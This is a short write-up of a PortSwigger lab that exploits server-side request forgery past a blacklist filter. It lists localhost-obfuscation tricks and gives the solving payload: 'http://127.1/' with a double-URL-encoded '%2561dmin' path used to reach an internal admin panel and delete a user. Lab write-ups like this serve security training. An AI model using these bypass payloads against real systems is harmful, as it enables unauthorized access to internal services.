## SSRF with blacklist-based input filter

**Title:** SSRF with blacklist-based input filter. [Go](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

**Description:** This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`. The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
 
## Preface

Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using the following techniques:

- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.

- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.

- Obfuscate blocked strings using URL encoding or case variation.

- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

## Methodology

### Finding the vulnerable parameter

In this particular lab we are interested in stock check feature.

### My Thought

Intercepting the "Check stock" request in Burp Suite, and sent it to Burp Repeater. Changeing the URL in the `stockApi` parameter to `http://127.0.0.1/` and we observed that the request is blocked. To bypass we changed the URL to: `http://127.1/`. But `http://127.1/admin` is also blocked. We obfuscated the "a" by double-URL encoding it to `%2561` to access the admin interface and delete the target user.
